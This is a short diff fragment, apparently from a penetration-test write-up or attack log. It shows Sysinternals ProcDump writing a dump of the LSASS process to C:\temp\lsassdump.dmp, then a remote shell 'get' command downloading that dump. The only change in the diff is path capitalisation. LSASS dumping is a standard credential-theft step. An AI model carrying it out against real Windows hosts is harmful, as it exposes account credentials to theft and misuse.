@@ -38,13 +38,13 @@ ProcDump v9.0 - Sysinternals process dump utility
 Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
 Sysinternals - www.sysinternals.com
 
-[02:41:23] Dump 1 initiated: C:\Temp\lsassdump.dmp
+[02:41:23] Dump 1 initiated: C:\temp\lsassdump.dmp
 [02:41:23] Dump 1 writing: Estimated dump file size is 32 MB.
 [02:41:23] Dump 1 complete: 32 MB written in 0.1 seconds
 [02:41:24] Dump count reached.
 
 C:\temp>get lsassdump.dmp
-[*] Downloading C:\\Temp\lsassdump.dmp
+[*] Downloading C:\\temp\lsassdump.dmp
 
 
 ========================================================================================================================
